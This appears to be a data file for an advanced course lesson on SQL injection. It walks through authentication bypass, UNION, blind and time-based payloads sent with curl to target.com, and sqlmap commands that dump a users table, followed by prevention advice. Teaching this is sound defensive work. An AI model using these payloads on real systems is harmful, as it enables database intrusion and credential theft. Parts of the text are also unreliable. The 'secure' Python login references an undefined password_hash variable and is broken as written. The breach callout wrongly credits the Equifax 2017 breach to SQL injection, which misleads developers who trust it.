export const lesson = {
  id: 'L37',
  title: 'SQL Injection: Discovery, Exploitation & Prevention',
  slug: 'sql-injection',
  type: 'PRACTICAL',
  duration: 55,
  xpReward: 40,
  difficulty: 'advanced',
  module: { title: 'Web Application Security', slug: 'web-security' },
  course: { title: 'Web Security Fundamentals', slug: 'web-security-fundamentals' },
  keyTerms: [
    'SQL Injection', 'SQLi', 'Union-Based', 'Blind SQLi',
    'Error-Based', 'Parameterized Queries', 'Prepared Statements',
    'sqlmap', 'WAF Bypass', 'Second-Order Injection'
  ],
  content: [
    { type: 'heading', content: 'SQL Injection: Discovery, Exploitation & Prevention' },
    { type: 'paragraph', content: 'SQL Injection is one of the oldest yet still most devastating web vulnerabilities. It occurs when user input is inserted directly into SQL queries without proper sanitization, allowing attackers to read, modify, or delete the entire database — and sometimes execute operating system commands.' },

    { type: 'callout', variant: 'info', content: 'Analogy: Imagine a bank teller who does exactly what you write on a withdrawal slip. Normally you write "Withdraw $100 from account #123". But SQL injection is writing: "Withdraw $100 from account #123; also transfer all money from every account to mine." The teller (database) just follows instructions without questioning them.' },

    { type: 'heading', level: 2, content: 'How SQL Injection Works' },
    { type: 'paragraph', content: 'A vulnerable application builds SQL queries by concatenating user input directly into the query string:' },

    { type: 'command', command: 'cat vulnerable_login.php', output: `<?php
// VULNERABLE CODE - Never do this!
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    echo "Login successful!";
}
?>`, explanation: 'This code directly inserts user input into the SQL query. If username is: admin\'-- the resulting query becomes: SELECT * FROM users WHERE username=\'admin\'--\' AND password=\'\' — The -- comments out the password check!' },

    { type: 'paragraph', content: 'What the attacker types in the username field:' },
    { type: 'command', command: "echo \"admin'--\"", output: `admin'--`, explanation: 'The single quote closes the username string in SQL. The -- is a SQL comment that ignores everything after it (including the password check). The query becomes: WHERE username=\'admin\' (always true for admin).' },

    { type: 'heading', level: 2, content: 'Types of SQL Injection' },

    { type: 'heading', level: 3, content: '1. In-Band (Classic) SQLi' },
    { type: 'paragraph', content: 'The attack and result use the same communication channel (the HTTP response).' },

    { type: 'paragraph', content: 'Error-Based SQLi — Uses database error messages to extract data:' },
    { type: 'command', command: "curl 'http://target.com/profile?id=1\\''", output: `Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1`, explanation: 'A single quote causes a SQL syntax error that the application displays. This confirms SQL injection is possible AND reveals the database type (MySQL). Never show database errors to users!' },

    { type: 'paragraph', content: 'Union-Based SQLi — Uses UNION to append additional queries:' },
    { type: 'command', command: "curl 'http://target.com/profile?id=1 UNION SELECT username,password,3 FROM users--'", output: `Profile: admin
Email: $2b$10$xH5kJ9mN2pL...hashed_password_here...
Member since: 3`, explanation: 'UNION combines results from two queries. The attacker matches the column count and extracts usernames and password hashes from the users table. The "3" is a placeholder to match the expected column count.' },

    { type: 'heading', level: 3, content: '2. Blind SQL Injection' },
    { type: 'paragraph', content: 'The application doesn\'t display query results or errors directly. The attacker asks yes/no questions and infers data from the response behavior.' },

    { type: 'paragraph', content: 'Boolean-Based Blind:' },
    { type: 'command', command: "curl 'http://target.com/profile?id=1 AND 1=1--'", output: `Profile: John Smith (normal page displayed)`, explanation: 'AND 1=1 is always true, so the page loads normally — confirming the injection point works.' },

    { type: 'command', command: "curl 'http://target.com/profile?id=1 AND 1=2--'", output: `Profile not found.`, explanation: 'AND 1=2 is always false, so no results returned. By comparing these two responses, the attacker confirms boolean-based blind SQLi.' },

    { type: 'command', command: "curl 'http://target.com/profile?id=1 AND SUBSTRING(database(),1,1)=\\'m\\'--'", output: `Profile: John Smith (page loads = first character is 'm')`, explanation: 'Extracting data one character at a time. If the first character of the database name is \'m\', the page loads normally. If not, it shows "not found". Repeat for each character position to spell out the full database name.' },

    { type: 'paragraph', content: 'Time-Based Blind:' },
    { type: 'command', command: "curl -w 'Time: %{time_total}s' 'http://target.com/profile?id=1; IF(1=1, SLEEP(5), 0)--'", output: `Profile: John Smith
Time: 5.234s`, explanation: 'If the condition is true, the database sleeps for 5 seconds. The attacker measures response time to infer true/false. Slow but works even when the page gives no visual difference.' },

    { type: 'heading', level: 2, content: 'Exploitation: Extracting an Entire Database' },
    { type: 'paragraph', content: 'Using sqlmap — the automated SQL injection tool:' },

    { type: 'command', command: 'sqlmap -u "http://target.com/profile?id=1" --dbs', output: `[11:15:32] [INFO] GET parameter 'id' is vulnerable
[11:15:32] [INFO] the back-end DBMS is MySQL
available databases [3]:
[*] information_schema
[*] webapp_db
[*] mysql`, explanation: 'sqlmap confirms the injection, identifies MySQL as the database, and lists all databases. --dbs enumerates databases.' },

    { type: 'command', command: 'sqlmap -u "http://target.com/profile?id=1" -D webapp_db --tables', output: `Database: webapp_db
[4 tables]
+------------------+
| users            |
| orders           |
| payments         |
| sessions         |
+------------------+`, explanation: 'Lists all tables in webapp_db. The "payments" table is especially interesting for an attacker.' },

    { type: 'command', command: 'sqlmap -u "http://target.com/profile?id=1" -D webapp_db -T users --dump', output: `Database: webapp_db
Table: users
[5 entries]
+----+----------+----------------------------------+-------------------+
| id | username | password                         | email             |
+----+----------+----------------------------------+-------------------+
| 1  | admin    | $2b$10$xH5kJ9mN2pL8qR...        | admin@company.com |
| 2  | john     | $2b$10$aB3cD4eF5gH6iJ...        | john@company.com  |
| 3  | sarah    | $2b$10$kL7mN8oP9qR0sT...        | sarah@company.com |
| 4  | mike     | $2b$10$uV1wX2yZ3aB4cD...        | mike@company.com  |
| 5  | guest    | $2b$10$eF5gH6iJ7kL8mN...        | guest@company.com |
+----+----------+----------------------------------+-------------------+`, explanation: 'Full user table dumped including password hashes. Even though passwords are hashed (bcrypt), weak passwords can still be cracked. The attacker now has all email addresses for phishing campaigns.' },

    { type: 'callout', variant: 'security', content: 'In real breaches, SQL injection has exposed: 145 million records (Equifax 2017), 77 million PlayStation accounts (Sony 2011), 130 million credit cards (Heartland 2008). A single injection vulnerability can compromise an entire organization.' },

    { type: 'heading', level: 2, content: 'Prevention: The Definitive Fixes' },

    { type: 'heading', level: 3, content: '1. Parameterized Queries (Prepared Statements)' },
    { type: 'paragraph', content: 'The #1 defense. Separates SQL code from data. The database treats parameters as data values, NEVER as executable code.' },

    { type: 'command', command: 'cat secure_login.py', output: `# SECURE CODE - Using parameterized queries
import psycopg2

def login(username, password):
    conn = psycopg2.connect(database="webapp_db")
    cursor = conn.cursor()
    
    # The %s placeholders are PARAMETERS, not string concatenation
    # The database engine treats them as DATA, never as SQL code
    query = "SELECT * FROM users WHERE username = %s AND password_hash = %s"
    cursor.execute(query, (username, password_hash))
    
    # Even if username = "admin'--", the database sees it as a literal string
    # The query remains: WHERE username = 'admin''--' (escaped, harmless)
    return cursor.fetchone()`, explanation: 'Parameterized queries completely prevent SQL injection. The database engine knows the %s values are DATA, not code. It automatically escapes any special characters.' },

    { type: 'command', command: 'cat secure_login.js', output: `// SECURE CODE - Node.js with Prisma ORM
async function login(username: string, password: string) {
  // Prisma automatically uses parameterized queries
  const user = await prisma.user.findUnique({
    where: { username: username }  // Safe - Prisma handles escaping
  });
  
  if (user && await bcrypt.compare(password, user.passwordHash)) {
    return user;
  }
  return null;
}`, explanation: 'ORMs (Object-Relational Mappers) like Prisma, Sequelize, and SQLAlchemy use parameterized queries internally. They\'re safe by default — another reason to use an ORM.' },

    { type: 'heading', level: 3, content: '2. Input Validation & Sanitization' },
    { type: 'list', items: [
      'Whitelist validation: If expecting a number, verify it IS a number (parseInt, regex)',
      'Reject or encode special characters: single quotes, double quotes, semicolons',
      'Maximum length limits: A username shouldn\'t be 10,000 characters',
      'Type checking: Use strict typing (TypeScript, strong schemas)',
      'NOTE: Input validation is a SECONDARY defense — parameterized queries are primary'
    ]},

    { type: 'heading', level: 3, content: '3. Least Privilege Database Access' },
    { type: 'list', items: [
      'Web application should connect to DB with MINIMAL permissions',
      'Read-only account for pages that only display data',
      'Never connect as the database root/admin user',
      'Separate accounts for different application functions',
      'Revoke DROP, ALTER, and file system access from web app accounts'
    ]},

    { type: 'heading', level: 3, content: '4. Web Application Firewall (WAF)' },
    { type: 'list', items: [
      'Blocks common SQLi patterns in HTTP requests',
      'Not a replacement for secure code — WAFs can be bypassed',
      'Useful as an additional layer (defense in depth)',
      'Examples: ModSecurity, AWS WAF, Cloudflare WAF'
    ]},

    { type: 'heading', level: 2, content: 'Summary & Security Implications' },
    { type: 'list', items: [
      'SQL injection remains in the OWASP Top 10 after 20+ years — it\'s that dangerous',
      'Always use parameterized queries / prepared statements — never concatenate user input into SQL',
      'ORMs provide protection by default but raw queries can still be vulnerable',
      'Blind SQLi is harder to exploit but equally dangerous (sqlmap automates it)',
      'Defense in depth: Parameterized queries + input validation + WAF + least privilege',
      'Test your applications: Use sqlmap and manual testing during security assessments',
      'Remember: A single SQLi vulnerability = complete database compromise'
    ]},
  ],
  navigation: {
    prev: { title: 'Introduction to Web Security & OWASP Top 10', slug: 'intro-web-security' },
    next: { title: 'Cross-Site Scripting (XSS)', slug: 'xss-attacks' },
  },
};
